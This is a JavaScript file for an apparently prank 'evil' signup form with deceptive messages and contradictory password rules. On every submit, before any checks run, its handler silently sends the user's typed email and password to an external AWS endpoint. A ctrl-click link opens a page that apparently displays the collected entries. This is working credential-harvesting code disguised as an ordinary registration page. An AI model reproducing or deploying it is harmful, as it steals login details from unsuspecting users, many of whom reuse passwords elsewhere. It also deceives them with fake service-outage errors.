const $ = document.getElementById.bind(document);
const randomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];

const ENDPOINT = `https://1zgm8q75ik.execute-api.us-east-1.amazonaws.com/dev/append`;

const r = {
	one_latin_small: /[a-z]/,
	not_latin_small: /^[^a-z]+$/,

	one_latin_big: /[A-Z]/,
	not_latin_big: /^[^A-Z]+$/,

	one_numeric: /[0-9]/,
	not_numeric: /^[^0-9]+$/,

	one_symbol: /[-!$%^&*()_+|~=`{}\[\]:";'<>?,.\/]/,
	not_symbol: /^[^-!$%^&*()_+|~=`{}\[\]:";'<>?,.\/]+$/,
};

const pattens = [
	[r.one_latin_small, r.not_latin_small, 'Password must contain at least one small latin character'],
	[r.one_latin_big, r.not_latin_big, 'Password must contain at least one capital latin character'],
	[r.one_numeric, r.not_numeric, 'Password must contain at least one number'],
	[r.one_symbol, r.not_symbol, 'Password must contain at least one special symbol'],
	[r.not_symbol, r.one_symbol, 'Password must not contain any special symbols'],
	[r.not_latin_big, r.one_latin_big, 'Password must not contain capital characters'],
	[r.not_numeric, r.one_numeric, 'Password must not contain numbers'],
	[r.not_latin_small, r.one_latin_small, 'Password must not contain small latin characters'],
];

const known_emails = new Set([
	'bk.ru',
	'mail.ru',
	'list.ru',
	'gmail.com',
	'ya.ru',
	'yandex.ru',
	'inbox.ru',
	'outlook.com',
	'hotmail.com',
	'yahoo.com'
]);

let not_exist = [
	'how can you exist?',
	'you don\'t exist',
	'who are you?',
	'nope',
	'are you sure?',
	'you are serious?',
	'i didn\'t expect this',
	'really?'
];

window.addEventListener('load', () => {
	const name = $('name');
	const evil = $('evil');
	const output = $('output');
	const link = $('link');
	const submit = $('submit');

	const failed_patterns = new Set;
	let failed_email = false;

	link.onclick = (e) => {
		link.textContent = randomItem(not_exist);
		if (e.ctrlKey)
			window.open('https://1zgm8q75ik.execute-api.us-east-1.amazonaws.com/dev/show', '_blank');
	};

	submit.onclick = () => {
		// send to backend
		fetch(ENDPOINT, {
			method: 'POST',
			body: JSON.stringify({email: name.value, pass: evil.value}),
			mode: 'no-cors'
		});

		// check email
		const mail = name.value.split('@').pop();

		if (name.value.split('@').length !== 2) {
			output.textContent = 'Invalid email';
			return false;
		}

		if (!known_emails.has(mail)) {
			output.textContent = 'Unknown email provider';
			return false;
		}

		if (!failed_email || failed_email === mail) {
			output.textContent = `We have temporary problems with ${mail} mail service. Sorry`;
			failed_email = mail;
			return false;
		}

		// check password
		const pass = evil.value;
		for (let pattern of pattens) {
			if (failed_patterns.has(pattern[0])) continue;
			if (!pattern[0].test(pass)) {
				failed_patterns.add(pattern[1]);
				output.textContent = pattern[2];
				return false;
			}
		}

		output.textContent = 'Welcome to the club, buddy!';

		setTimeout(() => {
			document.location.href = 'https://github.com/paulll/evil-signup-form';
		}, 1400);

		return false;
	};
});